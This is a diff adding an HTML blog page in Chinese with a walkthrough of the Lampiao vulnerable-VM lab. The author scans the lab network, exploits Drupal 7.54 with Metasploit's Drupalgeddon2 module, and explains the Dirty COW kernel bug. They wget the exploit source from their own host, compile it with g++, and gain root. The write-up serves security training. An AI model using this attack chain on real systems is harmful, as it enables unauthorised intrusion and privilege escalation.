@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>lampiao · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>lampiao</h1>
+    <div class="meta"></div>
+    <article><hr>
+<h2>title: lampao靶场
+datas: 2024.6.24
+tags:
+  - 靶场
+categories: 靶场
+keywords:
+description: lampao</h2>
+<p>Lampao</p>
+<h2>信息收集</h2>
+<pre><code class="language-kali">┌──(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255
+        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)
+        RX packets 1032607  bytes 1116865188 (1.0 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 399718  bytes 94273606 (89.9 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -sS 192.168.159.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 22:34 CST
+Nmap scan report for 192.168.159.1
+Host is up (0.00029s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 00:50:56:C0:00:08 (VMware)
+
+Nmap scan report for 192.168.159.2
+Host is up (0.000084s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+53/tcp open  domain
+MAC Address: 00:50:56:E1:64:0A (VMware)
+
+Nmap scan report for 192.168.159.131
+Host is up (0.00050s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:AB:2F:A2 (VMware)
+
+Nmap scan report for 192.168.159.254
+Host is up (0.00042s latency).
+All 1000 scanned ports on 192.168.159.254 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+MAC Address: 00:50:56:FC:B0:1B (VMware)
+
+Nmap scan report for 192.168.159.129
+Host is up (0.0000030s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 11.89 seconds
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -p- 192.168.159.131
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 22:39 CST
+Nmap scan report for 192.168.159.131
+Host is up (0.0021s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1898/tcp open  cymtec-port
+MAC Address: 00:0C:29:AB:2F:A2 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
+
+</code></pre>
+<p>看到开放了22端口，80端口和1898端口
+推测存在ssh，http，以及一个而后台登录的
+<img src="https://pic.imgdb.cn/item/6679856ad9c307b7e9ab749e.png" alt=""></p>
+<p>80端口访问一下发现没什么可以利用的</p>
+<p>转手就是1898</p>
+<p>一个看着很有年代感的东西
+<img src="https://pic.imgdb.cn/item/66798de1d9c307b7e9c6b588.png" alt=""></p>
+<pre><code>LuizGonzaga-LampiaoFalou.mp3
+</code></pre>
+<p>看到一个mp3的文件，先记下来不知道有没有用</p>
+<p>readmore打开发现是一个发展史</p>
+<p>看着没什么了，扫描一下后台吧那就
+<img src="https://pic.imgdb.cn/item/66798e00d9c307b7e9c74b36.png" alt="">
+<img src="https://pic.imgdb.cn/item/66798df3d9c307b7e9c70175.png" alt=""></p>
+<p>robots.txt开放，打开发现一堆东西</p>
+<pre><code class="language-发展史那页的链接">http://192.168.159.131:1898/?q=node/1
+</code></pre>
+<p>刚才看到我就想搞一搞这个，感觉可能存在sql</p>
+<pre><code>http://192.168.159.131:1898/?q=node/2
+</code></pre>
+<p>里面有一个
+audio.m4a
+qrc.png</p>
+<p>audio.m4a下载下来播放以后说是</p>
+<p>user:tiago</p>
+<p>图片是一个二维码，扫了没什么用</p>
+<p>看看扫面出来的其他的</p>
+<p>发现一个</p>
+<pre><code>/CHANGELOG.txt
+</code></pre>
+<p>进去以后上来就是Drupal 7.54, 2017-02-01</p>
+<p>OK版本号知道了</p>
+<p>感觉可以用一首crew来爆密码，毕竟刚才已经给了账号，但我直接搜的Drupal 7.54的漏洞，看到一个2018的RCE</p>
+<h2>提权</h2>
+<p>提权用的是脏牛，简单介绍一下脏牛吧</p>
+<h3>脏牛提权</h3>
+<pre><code> 脏牛漏洞的漏洞点位于 Linux 内核中的 &quot;mm/madvise.c&quot; 文件中。攻击者可以通过对某个可写的映射文件的 &quot;madvise()&quot; 系统调用进行操纵，从而触发内核中的一个缺陷。攻击者通过修改页表项和文件系统缓存，将映射文件的权限更改为 &quot;可写&quot;，并且将该文件映射到内存中。这样，攻击者可以在内存中修改文件的内容，并将多个进程的 Copy-On-Write 页面指向被修改的内存页，绕过 &quot;Copy-On-Write&quot; 的保护机制。
+</code></pre>
+<p>利用过程：</p>
+<ul>
+<li>攻击者首先找到一个可写的映射文件，通常是一个拥有 &quot;suid&quot; 或 &quot;sgid&quot; 权限的可执行文件。</li>
+<li>通过执行一段特制的代码，利用 &quot;madvise()&quot; 系统调用漏洞修改文件的权限。</li>
+<li>攻击者通过将修改后的文件映射到内存并修改其中的特定字段，来爆发该漏洞。</li>
+<li>当其他进程尝试对该映射文件执行写操作时，会将进程的 &quot;Copy-On-Write&quot; 页面指向被修改的内存页。</li>
+<li>最终，攻击者就能够在内核中执行具有 root 权限的恶意代码。</li>
+</ul>
+<h3>回归正题</h3>
+<pre><code>msf6 &gt; search drupal
+
+Matching Modules
+================
+
+   #   Name                                                              Disclosure Date  Rank       Check  Description
+   -   ----                                                              ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
+   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
+   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
+   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
+   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
+   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
+   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
+   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
+   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
+   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
+   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
+   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
+   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
+   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
+   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
+   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
+   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
+   22    \_ target: PHP In-Memory                                        .                .          .      .
+   23    \_ target: Unix In-Memory                                       .                .          .      .
+   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+
+Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval
+
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/66798e13d9c307b7e9c79dad.png" alt="">
+<img src="https://pic.imgdb.cn/item/66798e2fd9c307b7e9c7f853.png" alt="">
+use 1一发入魂（所以为什么有的师傅说1不行</p>
+<pre><code>www-data权限
+
+uname -a 看一眼系统，linux，用脏牛
+</code></pre>
+<p>msf搜一下有没有脚本
+<img src="https://pic.imgdb.cn/item/66798e47d9c307b7e9c84427.png" alt=""></p>
+<pre><code>find / -name 40487.cpp
+</code></pre>
+<p>cp到~，然后开放5555端口，用Py启一个服务器</p>
+<p><img src="https://pic.imgdb.cn/item/66798e55d9c307b7e9c867d5.png" alt=""></p>
+<pre><code>wget http://192.168.159.129:5555/40847.cpp
+
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil
+</code></pre>
+<p>直接G++提权</p>
+<ul>
+<li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li>
+<li>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</li>
+<li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li>
+<li>-std=c++11就是用按C++2011标准来编译的</li>
+<li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li>
+<li>-o 40847 gcc生成的目标文件,名字为40847</li>
+</ul>
+<p>看了眼过程是没问题的，但是结果好慢，我直接找了个wp截图的（hambugerhan师傅的，<a href="https://www.freebuf.com/articles/web/265340.html">链接</a>）
+<img src="https://pic.imgdb.cn/item/66798dded9c307b7e9c6af7f.png" alt="">
+直接出了PASSWORD，SSH登录就是ROOT，直接find flag.txt就可以了</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
